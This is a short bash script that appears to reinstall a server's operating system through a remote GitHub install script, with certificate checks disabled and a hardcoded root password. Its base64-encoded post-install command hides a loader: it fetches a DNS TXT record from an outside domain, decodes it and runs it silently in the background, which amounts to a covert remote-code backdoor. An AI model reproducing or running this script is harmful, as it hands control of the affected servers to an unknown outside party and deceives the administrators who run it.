#!/bin/bash
sleep 120
apt -qqy install wget
bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 11 -v 64 -a -p "Ls.5566123" -port 22 -console ttyS0 -cmd "IyEvYmluL2Jhc2gKCmFwdC1nZXQgaW5zdGFsbCAtcXF5IHdnZXQgYmluZDktaG9zdApiYXNoIDwoaG9zdCAtdCB0eHQgdHh0Lm14LmF2c3BpYy5jb20gfGN1dCAtZCciJyAtZjIgfGJhc2U2NCAtZCkgPi9kZXYvbnVsbCAyPiYxICYKCg=="
